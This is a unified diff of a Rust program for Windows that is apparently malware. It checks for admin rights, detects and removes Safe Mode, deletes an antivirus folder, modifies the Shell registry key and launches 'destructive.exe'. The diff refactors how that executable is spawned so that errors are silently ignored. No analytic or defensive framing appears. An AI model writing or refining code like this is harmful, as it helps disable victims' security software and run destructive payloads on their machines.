@@ -1,8 +1,9 @@
-use std::process::Command;
+use std::process::{Command, exit};
 use std::io::{self};
 use std::path::Path;
 use std::collections::HashMap;
 use wmi::{WMIConnection, COMLibrary};
+use std::env;
 
 fn is_admin() -> bool {
     let output = Command::new("whoami")
@@ -92,7 +93,7 @@ fn main() -> io::Result<()> {
     // Step 1: Admin Control Check
     if !is_admin() {
         eprintln!("You need administrator privileges to run this program.");
-        std::process::exit(0); // Exit the program with a success status
+        exit(0); // Exit the program with a success status
     }
 
     // Check for Safe Mode before proceeding
@@ -257,15 +258,18 @@ fn main() -> io::Result<()> {
             eprintln!("Error removing antivirus folder: {}", e);
         }
 
-        // Group 11: Finally, run destructive.exe
-        // Using %ProgramFiles% environment variable to avoid hardcoding the path
-        execute_command(r#""%ProgramFiles%\\utkudrk2\\destructive.exe""#);
+        if let Ok(program_files) = env::var("ProgramFiles") {
+            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
+            let _ = Command::new(&executable_path).spawn(); // Ignore errors
+        }
 
         println!("[+] Cleanup tasks completed. Safe Mode should now be removed, destructive.exe is scheduled to run, and Shell key is modified.");
     } else {
         println!("[+] Safe Mode is not detected. Running destructive.exe directly...");
-        // Using %ProgramFiles% environment variable to avoid hardcoding the path
-        execute_command(r#""%ProgramFiles%\\utkudrk2\\destructive.exe""#);
+        if let Ok(program_files) = env::var("ProgramFiles") {
+            let executable_path = format!(r"{}\utkudrk2\destructive.exe", program_files);
+            let _ = Command::new(&executable_path).spawn(); // Ignore errors
+        }
     }
 
     Ok(())
